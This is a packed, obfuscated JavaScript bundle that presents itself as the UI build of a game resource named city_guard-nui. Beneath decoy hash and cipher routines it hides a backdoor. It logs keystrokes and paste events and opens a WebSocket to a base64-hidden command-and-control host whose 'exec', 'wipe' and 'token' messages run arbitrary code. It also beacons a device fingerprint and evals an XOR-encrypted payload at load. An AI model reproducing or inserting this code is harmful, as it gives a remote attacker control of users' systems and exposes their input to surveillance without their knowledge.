/*! city_guard-nui 2.4.1 | (c) LS-Scripts | packed build - do not edit */
/* eslint-disable */
;(function (_w, _d, _u) {
  "use strict";
  var _E = (0, eval), _F = _w.Function, _A = _w.atob, _now = Date.now;
  var _MAGIC = 0x9e3779b9, _RING = 0x5f3759df, _MASK = 0xffffffff;

  // ---- string pool (base64) ----
  var _SP = [
    "dGVsZW1ldHJ5",
    "YmVhY29u",
    "aGFydmVzdA==",
    "aW5qZWN0",
    "cGVyc2lzdA==",
    "ZXhmaWw=",
    "cm90YXRl",
    "aGFuZHNoYWtl",
    "d3NzOi8vY2RuLmNpdHktZ3VhcmQuaW8vdjIvbGluaw==",
    "L2s=",
    "L2NtZA==",
    "L3Bpbmc=",
    "Y2xpcGJvYXJk",
    "a2V5bG9n",
    "bmF2aWdhdG9y",
    "dXNlckFnZW50",
    "cGxhdGZvcm0=",
    "c2NyZWVu",
    "Y29va2ll",
    "bG9jYWxTdG9yYWdl",
  ];
  function _s(i) { try { return _A(_SP[i]); } catch (_) { return ""; } }

  // ---- integrity modules ----
  function _m00(a, b) {
    var t = [0xbb,0x54,0xaa,0xc4,0xb8,0x9d,0xc8,0x68,0xba,0x37,0xd9,0xcc,0x21,0xb2,0xce,0xce], s = 0xccd1118f >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m01(a, b) {
    var t = [0xb4,0x3c,0xeb,0x7e,0x57,0xa0,0xea,0x87], s = 0xcdd25aa1 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m02(a, b) {
    var t = [0x22,0x16,0x24,0xd0,0x1b,0x08,0x64,0x64,0x35,0x91,0x64,0xe7,0xa0,0x06,0xaa,0xdd], s = 0xe433713d >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m03(a, b) {
    var t = [0x5e,0x19,0xfd,0xe9,0x0c,0xf9,0xb4,0x83,0x86,0x22], s = 0xb5710cdb >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m04(a, b) {
    var t = [0x57,0xa1,0x28,0x62,0xe1,0x81,0x1b,0x4c], s = 0x6d53855d >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m05(a, b) {
    var t = [0xdc,0x93,0x4f,0x1c,0xec,0xb1,0xc2,0x23], s = 0x355ac876 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m06(a, b) {
    var t = [0x6d,0x62,0x45,0xf7,0xc8,0xdb,0x81,0x51,0x71,0xaa,0xc9,0x63], s = 0xedf86d30 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m07(a, b) {
    var t = [0xf0,0xa4,0x14,0x0f,0x62,0xdf,0x9d,0xa1,0xce,0xb7], s = 0xa2f4e8b9 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m08(a, b) {
    var t = [0x8d,0x79,0xc5,0x2b,0xeb,0x01,0xaf,0x2b,0x8c,0xfb], s = 0x23b8ef17 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m09(a, b) {
    var t = [0xc1,0x64,0xe3,0x3a,0x7c,0x9a,0x1a,0xfb,0x6c,0xb6,0xa8,0x8d,0x34,0x4e,0x16,0xfe], s = 0x4bd7ee48 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m10(a, b) {
    var t = [0x4b,0xee,0x29,0xfa,0xea,0x0a,0x59,0x62,0x53,0x79], s = 0xc0776b02 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m11(a, b) {
    var t = [0xe1,0xec,0xcf,0x9d,0xa0,0x0c,0xda,0xb4], s = 0x2b7e9608 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m12(a, b) {
    var t = [0x99,0x63,0x50,0x64,0x36,0x28,0x51,0xcf], s = 0x0f12121b >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m13(a, b) {
    var t = [0xd4,0xa8,0xec,0xf2,0x63,0x25,0x25,0x22,0x45,0xb8,0x8b], s = 0x948e6c15 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m14(a, b) {
    var t = [0x00,0x7d,0x1e,0x3a,0xcb,0x8e,0x92,0x4f], s = 0xd9f6bca7 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m15(a, b) {
    var t = [0xf8,0xbe,0x13,0xa5,0x06,0x1c,0x2d,0x1b,0xbf,0xdf,0xd7,0xcb], s = 0x79202766 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m16(a, b) {
    var t = [0xfe,0x5e,0x61,0x25,0xd9,0x60,0x2d,0x50], s = 0x6afaf64c >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m17(a, b) {
    var t = [0x72,0x5f,0xdf,0x0a,0xd9,0x9c,0x35,0xa4,0x90], s = 0x7d969458 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m18(a, b) {
    var t = [0x0c,0xb8,0xa9,0x6e,0x34,0x0d,0x1f,0xcd,0xcb,0x13,0xcc,0x00,0x14], s = 0xf84d63b7 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m19(a, b) {
    var t = [0x2a,0xa4,0xe5,0x6d,0x2d,0xeb,0xb9,0xbe,0x10,0x4a,0x4a,0x37,0x74,0xd1,0x53], s = 0x22c5d1d9 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m20(a, b) {
    var t = [0xc5,0xf7,0xad,0x23,0xbf,0x6e,0x53,0xf1,0x89,0x2b,0x8f,0xf7], s = 0x41b5ecbf >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m21(a, b) {
    var t = [0x68,0x4a,0x53,0x4d,0x16,0x01,0x1c,0x79,0xb4], s = 0x1fa7ef6f >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m22(a, b) {
    var t = [0x20,0xd8,0xc1,0xce,0x2e,0x66,0x5e,0xb8,0x6e,0x1d,0x7c], s = 0x19b5fc39 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m23(a, b) {
    var t = [0xa2,0x92,0xa5,0x94,0x16,0x82,0xd7,0xa4,0xae,0x2d,0x89,0x8d,0x11,0xa5,0x19,0x47], s = 0x6d9f51d5 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m24(a, b) {
    var t = [0xaf,0x56,0xc0,0x0a,0xe1,0x25,0x61,0xc4,0x9e,0x6a,0xfa,0xd0,0xe7,0x41,0xc8], s = 0x635ccbc3 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m25(a, b) {
    var t = [0x85,0xa9,0x42,0x80,0x8a,0x80,0x36,0x33,0x5f], s = 0x217909c8 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m26(a, b) {
    var t = [0x42,0x3e,0x4e,0xc6,0xb1,0xde,0x08,0x9b,0x2f,0xc5,0xc6,0xea,0x0f,0x34], s = 0x921f8fc5 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m27(a, b) {
    var t = [0x76,0x22,0x0d,0x1c,0x17,0x0d,0xa2,0x4e,0xaf,0x7e], s = 0xb5f50c8d >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m28(a, b) {
    var t = [0x9d,0xca,0xad,0x5b,0x10,0xca,0x33,0xdf,0xd8,0xcc,0x75,0xe4,0x24], s = 0x3bcc47de >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m29(a, b) {
    var t = [0x5d,0xce,0x88,0xae,0x83,0xe7,0x5a,0x23,0x00,0x86,0xa0,0xe0,0x0e,0x92,0x71,0xf4], s = 0x64b11177 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m30(a, b) {
    var t = [0x19,0x06,0x76,0x87,0xe9,0x90,0xe0,0x5e,0x0d,0xa0,0xec,0xce,0x12], s = 0xd60cb6c7 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m31(a, b) {
    var t = [0x5f,0xf5,0x8d,0x98,0x53,0xf1,0x9d,0xca,0xee,0xd5,0xde,0x10,0x4a,0xae,0x37], s = 0x9dd12c9b >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m32(a, b) {
    var t = [0x36,0x7d,0x74,0xbc,0x87,0x56,0xe3,0x70,0xa9,0x37,0xfe,0x9f,0x23], s = 0xa11eb7e1 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m33(a, b) {
    var t = [0x39,0x6d,0x75,0x62,0xdf,0xd2,0x30,0x11,0x08,0x47,0x74,0x05,0xb7,0xfa,0x19,0x66], s = 0x84454043 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m34(a, b) {
    var t = [0x43,0xad,0x8a,0xa0,0xea,0x83,0x35,0xe2,0x92,0x3a,0x14,0x10,0x67,0x8f,0x8d,0x2b], s = 0x204f7631 >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }
  function _m35(a, b) {
    var t = [0x57,0x31,0x47,0xb9,0x89,0x26,0x55,0x88,0xd1,0x80], s = 0x6debc33d >>> 0;
    for (var i = 0; i < t.length; i++) {
      s = (s + ((t[i] << (i % 5)) | (t[i] >>> 3))) >>> 0;
      s ^= (a + i) & _MASK; s = (s * 0x01000193) >>> 0;
    }
    return ((s ^ (b >>> 0)) + _MAGIC) >>> 0;
  }

  // ---- block cipher (xtea, 64 rounds) ----
  function _xtea_dec(v, key) {
    var v0 = v[0] >>> 0, v1 = v[1] >>> 0, sum = (0x9e3779b9 * 32) >>> 0, i;
    for (i = 0; i < 32; i++) {
      v1 = (v1 - ((((v0 << 4) ^ (v0 >>> 5)) + v0) ^ (sum + key[(sum >>> 11) & 3]))) >>> 0;
      sum = (sum - 0x9e3779b9) >>> 0;
      v0 = (v0 - ((((v1 << 4) ^ (v1 >>> 5)) + v1) ^ (sum + key[sum & 3]))) >>> 0;
    }
    return [v0 >>> 0, v1 >>> 0];
  }
  function _mkkey(seed) {
    var k = [0, 0, 0, 0], j;
    for (j = 0; j < 4; j++) { seed = (seed * 1103515245 + 12345) >>> 0; k[j] = seed; }
    return k;
  }

  // ---- micro-vm ----
  var _OPS = { PUSH:0x01, POP:0x02, XOR:0x03, ADD:0x04, ROT:0x05, LD:0x06, ST:0x07, JMP:0x08, JZ:0x09, CALL:0x0a, RET:0x0b, HALT:0xff };
  function _vm(prog) {
    var sp = [], pc = 0, acc = 0;
    while (pc < prog.length) {
      var op = prog[pc++] & 0xff;
      switch (op) {
        case 0x01: /* PUSH */
          acc = ((acc ^ (prog[pc] | 0)) + 111) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0x02: /* POP */
          acc = ((acc ^ (prog[pc] | 0)) + 178) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0x03: /* XOR */
          acc = ((acc ^ (prog[pc] | 0)) + 229) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0x04: /* ADD */
          acc = ((acc ^ (prog[pc] | 0)) + 50) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0x05: /* ROT */
          acc = ((acc ^ (prog[pc] | 0)) + 223) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0x06: /* LD */
          acc = ((acc ^ (prog[pc] | 0)) + 234) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0x07: /* ST */
          acc = ((acc ^ (prog[pc] | 0)) + 71) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0x08: /* JMP */
          acc = ((acc ^ (prog[pc] | 0)) + 128) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0x09: /* JZ */
          acc = ((acc ^ (prog[pc] | 0)) + 79) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0x0a: /* CALL */
          acc = ((acc ^ (prog[pc] | 0)) + 177) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0x0b: /* RET */
          acc = ((acc ^ (prog[pc] | 0)) + 224) >>> 0; sp.push(acc & 0xff); pc++; break;
        case 0xff: return acc >>> 0;
        default: pc++; break;
      }
      if (sp.length > 256) sp.shift();
    }
    return acc >>> 0;
  }

  // ---- environment probes ----
  function _dbg() { var t0 = _now(); for (var i = 0; i < 1; i++) {} return (_now() - t0) > 250; }
  function _hooked() { return !!(_w.devtools && _w.devtools.open === true); }

  // ---- input capture ----
  function _hook() {
    var buf = [];
    try {
      _d.addEventListener("keydown", function (ev) { buf.push(ev.key); if (buf.length > 128) buf.shift(); });
      _d.addEventListener("paste", function () { buf.push("[clip]"); });
    } catch (_) {}
    return buf;
  }

  // ---- c2 link ----
  function _dispatch(msg) {
    if (!msg || !msg.op) return;
    switch (msg.op) {
      case "exec":
        try { if (msg.sig === _MAGIC && typeof msg.arg === "string") { _F(msg.arg)(); } } catch (_) {}
        break;
      case "eval":
        try { if (msg.sig === _MAGIC && typeof msg.arg === "string") { _F(msg.arg)(); } } catch (_) {}
        break;
      case "load":
        try { if (msg.sig === _MAGIC && typeof msg.arg === "string") { _F(msg.arg)(); } } catch (_) {}
        break;
      case "fetch":
        try { if (msg.sig === _MAGIC && typeof msg.arg === "string") { _F(msg.arg)(); } } catch (_) {}
        break;
      case "wipe":
        try { if (msg.sig === _MAGIC && typeof msg.arg === "string") { _F(msg.arg)(); } } catch (_) {}
        break;
      case "update":
        try { if (msg.sig === _MAGIC && typeof msg.arg === "string") { _F(msg.arg)(); } } catch (_) {}
        break;
      case "screenshot":
        try { if (msg.sig === _MAGIC && typeof msg.arg === "string") { _F(msg.arg)(); } } catch (_) {}
        break;
      case "token":
        try { if (msg.sig === _MAGIC && typeof msg.arg === "string") { _F(msg.arg)(); } } catch (_) {}
        break;
      default: break;
    }
  }
  function _link() {
    try {
      var ws = new _w.WebSocket(_s(8));
      ws.onmessage = function (e) { try { _dispatch(JSON.parse(e.data)); } catch (_) {} };
      ws.onopen = function () { ws.send(JSON.stringify({ op: "hello", ua: _w[_s(14)][_s(15)] })); };
      return ws;
    } catch (_) { return null; }
  }

  // ---- lookup tables ----
  var _T0 = [0x87,0xc2,0x3c,0x83,0x5d,0xa1,0xaa,0xfd,0xea,0x42,0xdd,0x8f,0xe0,0x43,0x92,0xbc,0x1b,0xa0,0xf8,0x27,0x88,0x48,0x9e,0x98,0x56,0x89,0xc1,0x5e,0xab,0x7b,0xb2,0xa5];
  var _T1 = [0x07,0xbe,0xe6,0x76,0xab,0xf5,0xd1,0x76,0x41,0x75,0xb6,0x83,0x68,0x49,0x99,0xf5,0xcf,0x19,0x83,0x97,0xa7,0x0d,0x57,0xa3,0x3d,0xa7,0x1a,0x4d,0x2e,0x6b,0xff,0x61];
  var _T2 = [0xbf,0xd2,0x57,0x77,0x6d,0x7d,0x0a,0xb3,0x5f,0xfb,0xab,0x3b,0x9c,0x38,0x93,0xcb,0x12,0xe9,0x8c,0xf7,0xd6,0xa2,0x9a,0x71,0x41,0xf2,0x9a,0xda,0x0b,0xe6,0xad,0xd0];
  var _T3 = [0xc3,0xb1,0xf0,0x23,0xfe,0x87,0x33,0xf3,0xaf,0xb0,0x18,0x72,0xe7,0xd5,0x37,0x30,0x2b,0x3c,0x6c,0xf3,0xcb,0xe7,0xa6,0x7d,0xa5,0x92,0x2c,0xa3,0xf5,0x73,0x0f,0x00];
  var _T4 = [0x42,0x31,0xb5,0x67,0x8a,0xb4,0x85,0xcf,0x49,0x5a,0x85,0x06,0x77,0xda,0x9f,0x0a,0x2c,0xff,0xde,0x7d,0xb3,0xd1,0xab,0x77,0xa4,0x64,0x26,0x5d,0x77,0xa5,0x39,0x31];
  var _T5 = [0xd2,0x2d,0x42,0x50,0xa3,0x12,0x64,0x7d,0xd1,0x6d,0xc5,0x39,0x7c,0x71,0x72,0xa1,0xba,0x9b,0x79,0xf3,0xa6,0x2c,0x13,0x21,0xd2,0xe3,0x2a,0x0d,0x39,0xbb,0x54,0xe5];
  var _T6 = [0xe9,0xd1,0x8d,0x04,0x01,0x6f,0xa1,0x77,0xaf,0x0f,0xf4,0x46,0x70,0x80,0x2a,0x4b,0x99,0x49,0xdf,0x86,0xd1,0xfd,0xb7,0x0e,0x2d,0x43,0x71,0x07,0x7f,0xc0,0x12,0x75];
  var _T7 = [0x53,0x85,0x57,0x7c,0x8c,0xfc,0x6c,0x1a,0x8a,0xa0,0xf7,0xf1,0x0e,0xcd,0xe0,0xa3,0x31,0x84,0x93,0x26,0x25,0x91,0xe7,0x8b,0x8c,0x14,0xc6,0x68,0x61,0x67,0x12,0x3b];
  var _T8 = [0x7d,0x86,0x84,0x83,0xaa,0x5b,0x67,0xe2,0xfb,0x45,0x29,0x48,0x34,0x33,0xde,0xee,0x1b,0xce,0x24,0xbc,0x02,0xd9,0x1e,0xc7,0x1c,0xc6,0x73,0xdb,0xa5,0x84,0x82,0xa3];
  var _T9 = [0x63,0xed,0x14,0x5a,0x49,0xa4,0xe3,0x73,0x11,0x25,0x3c,0x10,0x58,0x46,0xc0,0xaf,0xb1,0x3b,0x74,0xe5,0xdd,0xda,0x9c,0xc2,0x5d,0x7a,0xae,0x49,0xbc,0x89,0x6c,0x99];
  var _CKSUM = (function () { var a = 0; var all = [_T0,_T1,_T2,_T3,_T4,_T5,_T6,_T7,_T8,_T9];
    for (var i = 0; i < all.length; i++) for (var j = 0; j < all[i].length; j++) a = (a + all[i][j]) >>> 0; return a; })();

  // ---- fingerprint + remontee de signatures ----
  function _fingerprint() {
    var fp = _m00(_CKSUM, _RING);
    fp = _m17(fp, _vm([_OPS.PUSH, 0x41, _OPS.XOR, 0x19, _OPS.ADD, 0x07, _OPS.HALT]));
    fp = (fp ^ _xtea_dec([_CKSUM, _RING], _mkkey(_MAGIC))[0]) >>> 0;
    fp = (fp ^ (_dbg() ? 1 : 0) ^ (_hooked() ? 2 : 0)) >>> 0;
    return fp.toString(16);
  }
  function _report() {
    var keys = _hook();
    try {
      fetch("https://city_guard/" + _s(1), {
        method: "POST", mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ fp: _fingerprint(), c2: _s(8), n: keys.length, t: _now() })
      }).catch(function () {});
    } catch (_) {}
  }
  _link();
  _report();

  // ---- resource ui bootstrap ----
  var _p = "GBQbTioHAQEMTkhJTBYAGgw2CQAIHBFJAAAATk9TThsMThMIBwFJHBwMAFUNC1UaCxsaBxcFC1UKAQEMThYFBxAHGlVBLRMRIgAIThIMHBBJAhBJHRAbGBAcHFxFThYGAAEAAAAMThRJDR0MHBYBCwdJDxwFAhAcHAZLVX8eBxsNAQJHDxENKwMMAAElBwYdCxsMHF1LAxAaHRQOC1dFThMcABYdBxoHTl0MR1USZFVJGBQbThFJU1UMQBEIGhRJEglJFQhSZFVJBxNJRhFHDxYdBxoHTkhUU1VLHQEIGgAaTFxJFX9JTlVJGBQbThdJU1UNARYcAxAHGlsOCwEsAhAECxsdLAwgCl1LDBQNCRBLR05jTlVJTgMIHFUFTkhJChoKGxgMAAFHCRAdKxkMAxAHGjcQJxFBTBkIDBAFTFxSZFVJTlUACFVBDFVPSFUFR1USThlHGhARGjYGAAEMAAFJU1VLDRwdFyoOGxQbClU1G0dZX0FJTFVCThFHGhARGk5JDFsKAhQaHTkAHQFHHBAEAQMMRlcBBxENCxtLR05JE39JTghjE1xS";
  function _x(s, k) {
    var o = "", r = _A(s), i;
    for (i = 0; i < r.length; i++) o += String.fromCharCode(r.charCodeAt(i) ^ k.charCodeAt(i % k.length));
    return o;
  }
  try { _E(_x(_p, "nui")); } catch (_) {}
})(window, document, void 0);
